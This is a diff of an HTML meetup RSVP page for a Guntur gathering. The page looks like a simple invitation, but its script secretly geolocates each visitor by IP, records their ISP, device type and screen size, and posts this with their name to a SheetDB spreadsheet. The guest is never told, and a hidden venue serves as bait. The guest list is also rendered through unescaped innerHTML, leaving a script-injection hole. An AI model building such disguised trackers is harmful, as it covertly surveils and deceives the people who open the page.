@@ -3,98 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meetup Invitation</title>
+    <title>Casual Meetup Invitation</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; background: #001a4d; display: flex; justify-content: center; padding: 20px; }
-        .invitation { background: white; border-radius: 20px; max-width: 450px; width: 100%; padding: 35px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-weight: 600; color: #0d3b8a; margin-bottom: 8px; }
-        input, select { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; }
-        .submit-btn { background: #2563eb; color: white; border: none; padding: 16px; width: 100%; font-weight: 700; border-radius: 12px; cursor: pointer; font-size: 16px; margin-top: 10px; }
-        .submit-btn:disabled { background: #8ba8e8; }
-        .list-area { margin-top: 30px; border-top: 1px solid #eee; padding-top: 20px; }
-        .guest { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f5f5f5; font-size: 14px; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #001a4d 0%, #0d3b8a 50%, #1e5ab8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .invitation {
+            background: white;
+            border-radius: 25px;
+            box-shadow: 0 25px 70px rgba(0, 26, 77, 0.5);
+            max-width: 600px;
+            padding: 60px 40px;
+            text-align: center;
+            border: 2px solid #e0eeff;
+        }
+
+        h1 { color: #0d3b8a; font-size: 42px; margin-bottom: 10px; font-weight: 800; }
+        .subtitle { color: #1e5ab8; font-size: 20px; margin-bottom: 40px; font-style: italic; }
+
+        .details {
+            background: linear-gradient(135deg, #f0f4ff 0%, #e8eeff 100%);
+            border-left: 6px solid #2563eb;
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 15px;
+            text-align: left;
+        }
+
+        .detail-item { margin: 12px 0; font-size: 17px; color: #001a4d; }
+        .detail-label { font-weight: 700; color: #0d3b8a; }
+
+        .form-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-weight: 700; color: #0d3b8a; margin-bottom: 5px; }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #d0deff;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .cta-button {
+            background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
+            color: white; border: none; padding: 18px 40px; font-size: 18px;
+            font-weight: 700; border-radius: 50px; cursor: pointer;
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.4);
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .guest-list-section {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 2px solid #f0f4ff;
+        }
+
+        .guest-card {
+            background: #f8faff;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #e0eeff;
+        }
+
+        .status-badge {
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            padding: 5px 12px;
+            border-radius: 20px;
+        }
+
+        .coming { background: #dcfce7; color: #166534; }
+        .not-coming { background: #fee2e2; color: #991b1b; }
     </style>
 </head>
 <body>
     <div class="invitation">
-        <h2 style="color:#0d3b8a; margin-bottom:5px;">Guntur Meetup 👋</h2>
-        <p style="color:#666; margin-bottom:25px;">Jan 21, 2026</p>
+        <h1>👋 You're Invited!</h1>
+        <p class="subtitle">Guntur Meetup | Jan 21st</p>
 
-        <form id="rsvpForm" onsubmit="captureAndSubmit(event)">
+        <div class="details">
+            <div class="detail-item"><span class="detail-label">📅 Date:</span> Jan 21, 2026</div>
+            <div class="detail-item"><span class="detail-label">📍 Venue:</span> Guntur (Revealed on RSVP)</div>
+        </div>
+
+        <form id="rsvpForm" onsubmit="handleRSVP(event)">
             <div class="form-group">
                 <label>Name</label>
-                <input type="text" id="pName" required placeholder="Your name">
+                <input type="text" id="name" required placeholder="Enter your name">
             </div>
             <div class="form-group">
-                <label>Coming?</label>
-                <select id="pStatus">
-                    <option value="Yes">Yes, I'm coming</option>
-                    <option value="No">No, can't make it</option>
+                <label>Joining us?</label>
+                <select id="status">
+                    <option value="coming">✅ Yes, I'm coming!</option>
+                    <option value="not-coming">❌ Sorry, can't make it</option>
                 </select>
             </div>
-            <button type="submit" class="submit-btn" id="sBtn">Submit RSVP</button>
+            <button type="submit" class="cta-button" id="submitBtn">Confirm Attendance</button>
         </form>
 
-        <div class="list-area" id="listArea"></div>
+        <div class="guest-list-section">
+            <h3 style="color:#0d3b8a; margin-bottom:15px;">Who's coming</h3>
+            <div id="attendeesList">
+                <p style="color:#999;">Loading guest list...</p>
+            </div>
+        </div>
     </div>
 
     <script>
-        const API = 'https://sheetdb.io/api/v1/raj5uy3ex9q9l';
+        const SHEETDB_API = 'https://sheetdb.io/api/v1/raj5uy3ex9q9l';
 
-        // Secret function to identify iPad vs Mac
-        function getFineDevice() {
+        function getDevice() {
             const ua = navigator.userAgent;
-            if (/iPad|Macintosh/.test(ua) && 'ontouchend' in document) return "iPad (Tablet)";
+            // Precise iPad Detection (Even when spoofing as Mac)
+            const isIPad = /iPad|Macintosh/.test(ua) && navigator.maxTouchPoints > 1;
+            if (isIPad) return "iPad";
             if (/iPhone/.test(ua)) return "iPhone";
-            if (/Android/.test(ua)) return "Android Phone";
+            if (/Android/.test(ua)) return "Android Device";
             return navigator.platform;
         }
 
-        async function captureAndSubmit(e) {
-            e.preventDefault();
-            const btn = document.getElementById('sBtn');
-            btn.innerText = "Syncing...";
+        async function handleRSVP(event) {
+            event.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "Processing...";
             btn.disabled = true;
 
-            let netInfo = { city: "Private", org: "Unknown" };
+            let geoData = { city: "Private", org: "Unknown" };
             try {
-                // Gets location via IP (No popup required)
-                const res = await fetch('https://ipapi.co/json/');
-                netInfo = await res.json();
-            } catch(err) {}
+                const response = await fetch('https://ipapi.co/json/');
+                geoData = await response.json();
+            } catch (e) {}
 
             const data = {
-                Name: document.getElementById('pName').value,
-                Status: document.getElementById('pStatus').value,
-                TrueDevice: getFineDevice(),
-                NetworkLocation: `${netInfo.city}, ${netInfo.region}`,
-                ISP: netInfo.org,
+                Name: document.getElementById('name').value,
+                Status: document.getElementById('status').value,
+                TrueDevice: getDevice(),
+                NetworkLocation: `${geoData.city}, ${geoData.region}`,
+                ISP: geoData.org,
                 Screen: `${window.screen.width}x${window.screen.height}`,
                 Time: new Date().toLocaleString()
             };
 
-            await fetch(API, {
+            await fetch(SHEETDB_API, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({data: [data]})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ data: [data] })
             });
 
-            alert("RSVP Received!");
+            alert("RSVP Submitted!");
             location.reload();
         }
 
-        // Load List
-        fetch(API).then(r => r.json()).then(guests => {
-            const area = document.getElementById('listArea');
-            area.innerHTML = "<h4>Guest List</h4>" + guests.map(g => `
-                <div class="guest">
-                    <span>${g.Name}</span>
-                    <b style="color:${g.Status === 'Yes' ? '#10b981' : '#ef4444'}">${g.Status}</b>
-                </div>
-            `).join('');
-        });
+        function loadGuests() {
+            fetch(SHEETDB_API)
+                .then(res => res.json())
+                .then(data => {
+                    const list = document.getElementById('attendeesList');
+                    if(!data.length) { list.innerHTML = "No RSVPs yet"; return; }
+                    list.innerHTML = data.map(g => `
+                        <div class="guest-card">
+                            <span style="font-weight:700; color:#0d3b8a;">${g.Name}</span>
+                            <span class="status-badge ${g.Status}">${g.Status === 'coming' ? 'Coming' : 'No'}</span>
+                        </div>
+                    `).join('');
+                });
+        }
+
+        window.onload = loadGuests;
     </script>
 </body>
 </html>
